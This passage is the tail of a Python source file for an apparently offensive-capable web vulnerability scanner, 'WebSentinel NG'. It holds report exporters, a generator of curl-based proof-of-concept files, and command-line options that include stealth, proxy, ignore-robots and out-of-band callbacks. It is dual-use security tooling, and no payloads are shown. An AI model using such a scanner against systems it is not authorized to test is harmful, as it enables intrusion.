    print(f" Risk   : {r.stats.get('risk_score')}/100  Grade: {SEV_CLR.get(r.stats.get('grade'),G)}{r.stats.get('grade')}{Z}")
    print(f" Findings: {r.stats.get('total')} | Max CVSS: {r.stats.get('max_cvss')} | Pages: {r.stats.get('pages')}")
    by=r.stats.get("by_severity",{})
    print(" "+"  ".join(f"{SEV_CLR.get(s,Z)}{s}={n}{Z}" for s,n in
          sorted(by.items(),key=lambda x:SEV_RANK.get(x[0],0),reverse=True)))
    facts=r.facts
    surface=[]
    if facts.get("technologies"): surface.append("Tech: "+", ".join(facts["technologies"][:6]))
    if facts.get("subdomains"): surface.append(f"Subdomains: {len(facts['subdomains'])}")
    if facts.get("open_ports"): surface.append(f"Ports: {len(facts['open_ports'])}")
    if facts.get("js_endpoints"): surface.append(f"API endpoints: {len(facts['js_endpoints'])}")
    if facts.get("waf"): surface.append(f"WAF: {facts['waf']}")
    if facts.get("authentication"): surface.append("Auth: "+str(facts["authentication"].get("successful")))
    if surface: print(" Surface: "+" | ".join(surface))
    if baseline is not None:
        now={(f.category,f.title,f.url,f.evidence[:80]) for f in r.findings}
        new=now-baseline; fixed=baseline-now
        print(f" Delta  : {G}NEW {len(new)}{Z} / {Y}FIXED {len(fixed)}{Z}")
    chains=[f for f in r.findings if f.severity in ("HIGH","CRITICAL")]
    if chains:
        print(f"{Y} Exploit-chain candidates: {', '.join(sorted({f.category for f in chains})[:8])}{Z}")
    print(f"{BD}{'-'*76}{Z}")
    for f in r.findings[:45]:
        print(f" {SEV_CLR.get(f.severity,Z)}{BD}[{f.severity} {f.score:.1f}]{Z} {f.category}/{f.title}")
        if f.detail: print(f"     {sanitize(f.detail,118)}")
        if f.evidence: print(f"     > {sanitize(f.evidence,108)}")
        print(f"     {f.cwe} | {f.owasp}"+(f" | {f.url}" if f.url else ""))
    if len(r.findings)>45: print(f" ... +{len(r.findings)-45} more (see exports)")
    print(f"{BD}{'='*76}{Z}\n")

def export_pocs(r:Report,directory:str) -> None:
    if not directory: return
    os.makedirs(directory,exist_ok=True); n=0
    for f in r.findings:
        if not f.url or f.severity=="INFO": continue
        n+=1
        safe=re.sub(r"[^A-Za-z0-9]+","_",f.title)[:40] or f"finding_{n}"
        with open(os.path.join(directory,f"poc_{n:02d}_{safe}.sh"),"w",encoding="utf-8") as fh:
            fh.write("#!/bin/sh\n# WebSentinel PoC - "+f.title+"\n")
            fh.write(f"curl -sk -i '{f.url}' -H 'User-Agent: WebSentinel-PoC'\n")
        if f.category in ("XSS","Redirect"):
            with open(os.path.join(directory,f"poc_{n:02d}_{safe}.html"),"w",encoding="utf-8") as fh:
                fh.write("<!doctype html><html><body><a href='"+html.escape(f.url)+"'>Open PoC</a></body></html>")
    out(f"PoCs -> {directory} ({n} files)","OK")

def export(r:Report,cfg:Config,baseline:Optional[Set[Any]]=None) -> None:
    if cfg.json_out:
        with open(cfg.json_out,"w",encoding="utf-8") as fh: json.dump(r.to_dict(),fh,indent=2,ensure_ascii=False)
        out(f"JSON -> {cfg.json_out}","OK")
    if cfg.csv_out:
        with open(cfg.csv_out,"w",newline="",encoding="utf-8") as fh:
            w=csv.writer(fh); w.writerow(["severity","score","cvss","cwe","owasp","category","title","detail","url","evidence","remediation"])
            for f in r.findings: w.writerow([f.severity,f.score,f.vector,f.cwe,f.owasp,f.category,f.title,f.detail,f.url,f.evidence,f.remediation])
        out(f"CSV -> {cfg.csv_out}","OK")
    if cfg.md_out:
        L=[f"# WebSentinel NG — {r.target}","",
           f"- Risk: **{r.stats.get('risk_score')}/100 ({r.stats.get('grade')})**",
           f"- Findings: {r.stats.get('total')} | Max CVSS: {r.stats.get('max_cvss')}","",
           "| Sev | CVSS | Category | Finding | CWE | OWASP |","|---|---|---|---|---|---|"]
        for f in r.findings: L.append(f"| {f.severity} | {f.score:.1f} | {f.category} | {f.title} | {f.cwe} | {f.owasp} |")
        with open(cfg.md_out,"w",encoding="utf-8") as fh: fh.write("\n".join(L))
        out(f"Markdown -> {cfg.md_out}","OK")
    if cfg.sarif_out:
        rules=[{"id":f.cwe,"shortDescription":{"text":f.title}} for f in r.findings]
        results=[{"ruleId":f.cwe,"level":{"CRITICAL":"error","HIGH":"error","MEDIUM":"warning","LOW":"note","INFO":"note"}[f.severity],
          "message":{"text":f"{f.title}: {f.detail}"},"locations":[{"physicalLocation":{"artifactLocation":{"uri":f.url or "target"}}}],
          "properties":{"cvss":f.score,"owasp":f.owasp,"severity":f.severity}} for f in r.findings]
        sarif={"$schema":"https://json.schemastore.org/sarif-2.1.0.json","version":"2.1.0",
          "runs":[{"tool":{"driver":{"name":"WebSentinelNG","version":VERSION,"rules":rules}},"results":results}]}
        with open(cfg.sarif_out,"w",encoding="utf-8") as fh: json.dump(sarif,fh,indent=2)
        out(f"SARIF -> {cfg.sarif_out}","OK")
    if cfg.html_out:
        rows=[]
        for f in r.findings:
            hx=SEV_HEX[f.severity]
            rows.append(f"<tr><td style='color:{hx};font-weight:700'>{f.severity}</td><td>{f.score:.1f}</td>"
              f"<td>{html.escape(f.category)}</td><td>{html.escape(f.title)}<br><small>{html.escape(sanitize(f.detail,220))}</small></td>"
              f"<td>{html.escape(sanitize(f.evidence,160))}</td><td>{f.cwe}<br><small>{html.escape(f.owasp)}</small></td></tr>")
        by=r.stats.get("by_severity",{})
        mx=max(by.values()) if by else 1
        bars="".join(f"<div style='margin:4px 0'><span style='display:inline-block;width:80px'>{s}</span>"
            f"<div style='display:inline-block;background:{SEV_HEX.get(s,'#888')};height:14px;width:{int(by.get(s,0)/mx*420)}px'></div> {by.get(s,0)}</div>"
            for s in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"))
        facts="".join(f"<h3>{html.escape(k)}</h3><pre>{html.escape(json.dumps(v,indent=2,ensure_ascii=False)[:5000])}</pre>"
            for k,v in r.facts.items())
        doc=f"""<!doctype html><html><head><meta charset="utf-8"><title>WebSentinel Report</title><style>
body{{font-family:system-ui,Segoe UI,sans-serif;margin:22px;background:#fafafa;color:#222}}
table{{border-collapse:collapse;width:100%;background:#fff}}th,td{{border:1px solid #ddd;padding:7px;font-size:13px;vertical-align:top}}
th{{background:#222;color:#fff}}pre{{background:#f0f0f0;padding:10px;overflow:auto}}.badge{{background:#222;color:#fff;padding:4px 9px;border-radius:5px}}
</style></head><body><h1>WebSentinel NG v{VERSION}</h1><p><b>{html.escape(r.target)}</b> &nbsp;
<span class="badge">{r.stats.get('risk_score')}/100</span> <span class="badge">{r.stats.get('grade')}</span></p>
<h2>Risk distribution</h2>{bars}
<p>Findings: {r.stats.get('total')} | Max CVSS: {r.stats.get('max_cvss')} | Pages: {r.stats.get('pages')} | {r.started}</p>
<table><thead><tr><th>Sev</th><th>CVSS</th><th>Category</th><th>Finding</th><th>Evidence</th><th>Refs</th></tr></thead>
<tbody>{''.join(rows) or '<tr><td colspan=6>No findings</td></tr>'}</tbody></table>
<h2>Attack surface / facts</h2>{facts}</body></html>"""
        with open(cfg.html_out,"w",encoding="utf-8") as fh: fh.write(doc)
        out(f"HTML -> {cfg.html_out}","OK")
    export_pocs(r,cfg.poc_dir)

# --------------------------------------------------------------------------- #
#  CLI
# --------------------------------------------------------------------------- #

def build_parser() -> argparse.ArgumentParser:
    p=argparse.ArgumentParser(prog="web_sentinel.py",
      description="Next-gen web attack surface assessment platform (authorized use only).")
    p.add_argument("target",nargs="?",help="Target URL or hostname")
    p.add_argument("--targets",help="File with one target per line (multi-target mode)")
    p.add_argument("--config",help="JSON config file (scope/auth/headers/options)")
    p.add_argument("-p","--profile",choices=list(PROFILES),default="standard")
    p.add_argument("-t","--threads",type=int,default=16)
    p.add_argument("--timeout",type=float,default=8.0)
    p.add_argument("--rps",type=float,default=0.0); p.add_argument("--jitter",type=float,default=0.0)
    p.add_argument("--stealth",action="store_true"); p.add_argument("--proxy",help="http://host:port")
    p.add_argument("--insecure",action="store_true"); p.add_argument("--ignore-robots",action="store_true")
    p.add_argument("--include-subdomains",action="store_true")
    p.add_argument("--scope-include",help="Comma-separated allowed domains")
    p.add_argument("--scope-exclude",help="Comma-separated blocked domains")
    p.add_argument("--max-pages",type=int,default=120); p.add_argument("--depth",type=int,default=3)
    p.add_argument("--max-targets",type=int,default=20); p.add_argument("--payload-budget",type=int,default=600)
    p.add_argument("--wordlist",choices=["small","medium","large"],default="medium")
    p.add_argument("--wordlist-file",help="Custom directory wordlist")
    p.add_argument("--ports",help="e.g. 80,443,8080")
    p.add_argument("--header",action="append",default=[],metavar="K:V")
    p.add_argument("--cookie",action="append",default=[],metavar="K=V")
    p.add_argument("--modules",help="Comma-separated module names")
    p.add_argument("--exclude",help="Comma-separated modules to skip")
    p.add_argument("--list-modules",action="store_true")
    p.add_argument("--login-url"); p.add_argument("--user",dest="username")
    p.add_argument("--pass",dest="password"); p.add_argument("--user-field",default="username")
    p.add_argument("--pass-field",default="password"); p.add_argument("--verify-login")
    p.add_argument("--login-extra",help="JSON object of extra login fields")
    p.add_argument("--browser-login",action="store_true")
    p.add_argument("--oob",action="store_true"); p.add_argument("--oob-http-port",type=int,default=8099)
    p.add_argument("--oob-dns-port",type=int,default=55353); p.add_argument("--oob-domain",default="")
    p.add_argument("--baseline",help="Previous JSON report for diffing")
    p.add_argument("--json",dest="json_out"); p.add_argument("--html",dest="html_out")
    p.add_argument("--csv",dest="csv_out"); p.add_argument("--sarif",dest="sarif_out")
    p.add_argument("--md",dest="md_out"); p.add_argument("--poc-dir")
    p.add_argument("--fail-on",choices=list(SEV_RANK),help="Exit 1 if a finding >= severity")
    p.add_argument("-v","--verbose",action="store_true")
    p.add_argument("--version",action="version",version=f"WebSentinel NG {VERSION}")
    return p

def parse_target(raw:str,cfg:Config) -> bool:
    raw=raw.strip().lstrip("\ufeff")
    if not raw: return False
    if not re.match(r"^https?://",raw,re.I): raw="https://"+raw
    p=urllib.parse.urlsplit(raw)
    if not p.hostname: return False
    cfg.scheme=p.scheme.lower(); cfg.host=p.hostname; cfg.port=p.port
    cfg.target=urllib.parse.urlunsplit((p.scheme,p.netloc,p.path or "/",p.query,""))
    return True

def apply_config(cfg:Config,path:str) -> None:
    if not path or not os.path.isfile(path): return
    with contextlib.suppress(Exception):
        with open(path,encoding="utf-8-sig") as fh: d=json.load(fh)
        for k in ("profile","threads","timeout","rps","jitter","stealth","proxy","verify_tls",
                  "respect_robots","include_subs","max_pages","max_depth","max_targets",
                  "payload_budget","wordlist","wordlist_file"):
            if k in d: setattr(cfg,k,d[k])
        for k in ("scope_include","scope_exclude","modules"):
            if k in d: setattr(cfg,k,list(d[k]))
        if "exclude" in d: cfg.exclude_modules=set(d["exclude"])
        if "headers" in d: cfg.extra_headers.update(d["headers"])
        if "cookies" in d: cfg.cookie_values.update(d["cookies"])
        if "ports" in d: cfg.ports=list(d["ports"])
        for k in ("login_url","username","password","user_field","pass_field","verify_login","browser_login"):
            if k in d: setattr(cfg,k,d[k])
        if "login_extra" in d: cfg.login_extra.update(d["login_extra"])
        out(f"Config loaded: {path}","OK")

def cfg_from_args(args:argparse.Namespace) -> Config:
    cfg=Config(); apply_config(cfg,args.config)
    if not args.target and not args.targets: return cfg
    prof=PROFILES[args.profile]
    cfg.profile=args.profile
    if args.threads==16 and "threads" in prof: cfg.threads=prof["threads"]
    else: cfg.threads=args.threads
    if args.max_pages==120: cfg.max_pages=prof["max_pages"]
    else: cfg.max_pages=args.max_pages
    if args.depth==3: cfg.max_depth=prof["max_depth"]
    else: cfg.max_depth=args.depth
    if args.max_targets==20: cfg.max_targets=prof["max_targets"]
    else: cfg.max_targets=args.max_targets
    if args.payload_budget==600: cfg.payload_budget=prof["payload_budget"]
    else: cfg.payload_budget=args.payload_budget
    if args.wordlist=="medium" and not cfg.wordlist_file: cfg.wordlist=prof["wordlist"]
    else: cfg.wordlist=args.wordlist
    cfg.exclude_modules|=set(prof["exclude"])
    if args.exclude: cfg.exclude_modules|={x.strip() for x in args.exclude.split(",")}
    if args.modules: cfg.modules=[x.strip() for x in args.modules.split(",")]
    cfg.timeout=args.timeout; cfg.rps=args.rps; cfg.jitter=args.jitter
    cfg.stealth=cfg.stealth or args.stealth or prof.get("stealth",False)
    if cfg.stealth and not cfg.jitter: cfg.jitter=0.3
    cfg.proxy=cfg.proxy or args.proxy
    cfg.verify_tls=not args.insecure; cfg.respect_robots=not args.ignore_robots
    cfg.include_subs=cfg.include_subs or args.include_subdomains
    cfg.scope_include=cfg.scope_include or ([x.strip() for x in args.scope_include.split(",")] if args.scope_include else [])
    cfg.scope_exclude=cfg.scope_exclude or ([x.strip() for x in args.scope_exclude.split(",")] if args.scope_exclude else [])
    cfg.wordlist_file=cfg.wordlist_file or args.wordlist_file
    if args.ports:
        with contextlib.suppress(Exception): cfg.ports=sorted({int(x) for x in args.ports.split(",")})
    for h in args.header:
        if ":" in h:
            k,v=h.split(":",1); cfg.extra_headers[k.strip()]=v.strip()
    for c in args.cookie:
        if "=" in c:
            k,v=c.split("=",1); cfg.cookie_values[k.strip()]=v.strip()
    for k in ("login_url","username","password","user_field","pass_field","verify_login"):
        if getattr(args,k): setattr(cfg,k,getattr(args,k))
    cfg.browser_login=cfg.browser_login or args.browser_login
    if args.login_extra:
        with contextlib.suppress(Exception): cfg.login_extra.update(json.loads(args.login_extra))
    cfg.oob=args.oob; cfg.oob_http_port=args.oob_http_port
    cfg.oob_dns_port=args.oob_dns_port; cfg.oob_domain=args.oob_domain
    cfg.baseline=args.baseline; cfg.json_out=args.json_out; cfg.html_out=args.html_out
    cfg.csv_out=args.csv_out; cfg.sarif_out=args.sarif_out; cfg.md_out=args.md_out
    cfg.poc_dir=args.poc_dir; cfg.fail_on=args.fail_on or ""; cfg.verbose=args.verbose
    return cfg

def main(argv:Optional[Sequence[str]]=None) -> int:
    args=build_parser().parse_args(argv)
    if args.list_modules:
        print(f"{BD}Modules ({len(MODULES)}):{Z}")
        for m in sorted(MODULES,key=lambda x:(x["phase"],x["name"])):
            print(f"  {m['name']:<14} {m['phase']:<10} {m['category']}")
        return 0
    cfg=cfg_from_args(args)
    targets=[]
    if args.targets and os.path.isfile(args.targets):
        with open(args.targets,encoding="utf-8",errors="ignore") as fh:
            targets=[x.strip().lstrip("\ufeff") for x in fh
                     if x.strip().lstrip("\ufeff") and not x.strip().lstrip("\ufeff").startswith("#")]
    if args.target: targets.insert(0,args.target)
    if not targets:
        out("Target required (or --targets file / --list-modules).","ERROR"); return 2
    banner()
    base=load_baseline(cfg.baseline)
    reports=[]
    for t in targets:
        c=Config(**{k:v for k,v in asdict(cfg).items() if k not in ("_lock",)})
        if not parse_target(t,c):
            out(f"Invalid target: {t}","WARN"); continue
        try:
            rep=asyncio.run(Engine(c).run())
        except KeyboardInterrupt:
            out("Interrupted.","WARN"); return 130
        except Exception as e:  # noqa: BLE001
            out(f"Scan failed for {t}: {type(e).__name__}: {e}","ERROR"); continue
        summarize(rep,base if len(targets)==1 else None)
        export(rep,c,base if len(targets)==1 else None)
        reports.append(rep)
    if len(reports)>1 and cfg.json_out:
        combined={"targets":[r.target for r in reports],
                  "reports":[r.to_dict() for r in reports]}
        with open(cfg.json_out,"w",encoding="utf-8") as fh: json.dump(combined,fh,indent=2,ensure_ascii=False)
        out(f"Combined report -> {cfg.json_out}","OK")
    if cfg.fail_on:
        thr=SEV_RANK[cfg.fail_on]
        if any(SEV_RANK.get(f.severity,0)>=thr for r in reports for f in r.findings):
            out(f"Fail-on threshold met: >= {cfg.fail_on}","ERROR"); return 1
    return 0

if __name__=="__main__":
    sys.exit(main())
